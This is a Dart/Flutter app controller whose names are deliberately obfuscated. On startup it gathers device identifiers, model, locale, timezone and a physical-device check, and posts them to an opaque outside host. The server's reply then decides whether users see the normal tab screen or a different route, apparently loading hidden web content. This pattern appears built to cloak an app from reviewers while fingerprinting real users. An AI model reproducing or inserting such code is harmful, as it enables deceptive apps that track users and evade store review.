import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var cmgfnvw = RxBool(false);
  var veclzpoqs = RxBool(true);
  var zrmgfpk = RxString("");
  var cristopher = RxBool(false);
  var fisher = RxBool(true);
  final thdgiyaron = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    lcqkzwh();
  }


  Future<void> lcqkzwh() async {

    cristopher.value = true;
    fisher.value = true;
    veclzpoqs.value = false;

    thdgiyaron.post("https://lat.ban88461.xyz/mgcsnoqvfbzrxph",data: await jqwrlmkc()).then((value) {
      var rqmuhyln = value.data["rqmuhyln"] as String;
      var pgsfh = value.data["pgsfh"] as bool;
      if (pgsfh) {
        zrmgfpk.value = rqmuhyln;
        lacey();
      } else {
        bode();
      }
    }).catchError((e) {
      veclzpoqs.value = true;
      fisher.value = true;
      cristopher.value = false;
    });
  }

  Future<Map<String, dynamic>> jqwrlmkc() async {
    final DeviceInfoPlugin rdozxab = DeviceInfoPlugin();
    PackageInfo hbjzxvo_tzwnaebf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var dpkai = Platform.localeName;
    var bnkuv = currentTimeZone;

    var vroh = hbjzxvo_tzwnaebf.packageName;
    var vrlfcea = hbjzxvo_tzwnaebf.version;
    var lkapqi = hbjzxvo_tzwnaebf.buildNumber;

    var vxlmkjc = hbjzxvo_tzwnaebf.appName;
    var sqzixtl = "";
    var jwahmug = "";
    var lryq  = "";
    var nannieOberbrunner = "";
    var janelleGleason = "";
    var barbaraNitzsche = "";
    var joanRath = "";
    var brandtGislason = "";


    var khivr = "";
    var calmu = false;

    if (GetPlatform.isAndroid) {
      khivr = "android";
      var tovjms = await rdozxab.androidInfo;

      sqzixtl = tovjms.brand;

      jwahmug  = tovjms.model;
      lryq = tovjms.id;

      calmu = tovjms.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      khivr = "ios";
      var belykvqut = await rdozxab.iosInfo;
      sqzixtl = belykvqut.name;
      jwahmug = belykvqut.model;

      lryq = belykvqut.identifierForVendor ?? "";
      calmu  = belykvqut.isPhysicalDevice;
    }
    var res = {
      "vxlmkjc": vxlmkjc,
      "janelleGleason" : janelleGleason,
      "lkapqi": lkapqi,
      "vroh": vroh,
      "jwahmug": jwahmug,
      "bnkuv": bnkuv,
      "barbaraNitzsche" : barbaraNitzsche,
      "sqzixtl": sqzixtl,
      "lryq": lryq,
      "nannieOberbrunner" : nannieOberbrunner,
      "khivr": khivr,
      "calmu": calmu,
      "vrlfcea": vrlfcea,
      "brandtGislason" : brandtGislason,
      "joanRath" : joanRath,
      "dpkai": dpkai,

    };
    return res;
  }

  Future<void> bode() async {
    Get.offAllNamed("/tab");
  }

  Future<void> lacey() async {
    Get.offAllNamed("/password_toast");
  }

}
